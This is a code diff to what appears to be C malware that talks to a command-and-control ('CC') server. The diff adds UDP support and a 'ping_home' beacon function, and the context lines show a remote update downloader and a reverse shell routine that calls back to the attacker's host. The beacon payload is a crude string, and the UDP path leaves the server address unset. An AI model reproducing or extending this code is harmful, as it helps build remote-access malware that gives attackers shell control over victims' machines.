@@ -16,15 +16,21 @@
 #include "utils.h"
 
 int connect_cc(char *ip_adrr, int port, int *socket_desc,
-	       struct sockaddr_in *server)
+	       struct sockaddr_in *server, int isTCP)
 {
-	(*socket_desc) = socket(AF_INET, SOCK_STREAM, 0);
+	if (isTCP) // 1
+		(*socket_desc) = socket(AF_INET, SOCK_STREAM, 0);
+	else // 0
+		(*socket_desc) = socket(AF_INET, SOCK_DGRAM, 0);
+
 	if ((*socket_desc) == ERROR) {
 		printf("Error creating socket\n");
 		return ERROR;
 	}
 
-	server->sin_addr.s_addr = inet_addr(ip_adrr);
+	if (isTCP)
+		server->sin_addr.s_addr = inet_addr(ip_adrr);
+
 	server->sin_family = AF_INET;
 	server->sin_port = htons(port);
 
@@ -37,6 +43,21 @@ int connect_cc(char *ip_adrr, int port, int *socket_desc,
 	return OK;
 }
 
+int ping_home(char *ip_addr, int port)
+{
+	int socket_desc = 0;
+	struct sockaddr_in server;
+
+	if (connect_cc(ip_addr, port, &socket_desc, &server, 0) == ERROR) {
+		printf("Error connecting to the server\n");
+		return ERROR;
+	}
+
+	send(socket_desc, "send nudes pls", STD_SIZE, 0);
+
+	return OK;
+}
+
 int download_update(char *ip_addr, int port)
 {
 	int socket_desc = 0;
@@ -45,7 +66,7 @@ int download_update(char *ip_addr, int port)
 	struct sockaddr_in server;
 	int f = 0;
 
-	if (connect_cc(ip_addr, port, &socket_desc, &server) == ERROR) {
+	if (connect_cc(ip_addr, port, &socket_desc, &server, 1) == ERROR) {
 		printf("Error connecting to the server\n");
 		return ERROR;
 	}
@@ -76,7 +97,7 @@ int reverse_shell(char *ip_addr, int port)
 	char *welcome_message = "Connected to shell\n$ ";
 	char *command_output = NULL;
 
-	if (connect_cc(ip_addr, port, &socket_desc, &server) == ERROR) {
+	if (connect_cc(ip_addr, port, &socket_desc, &server, 1) == ERROR) {
 		printf("Error connecting to CC server\n");
 		return ERROR;
 	}
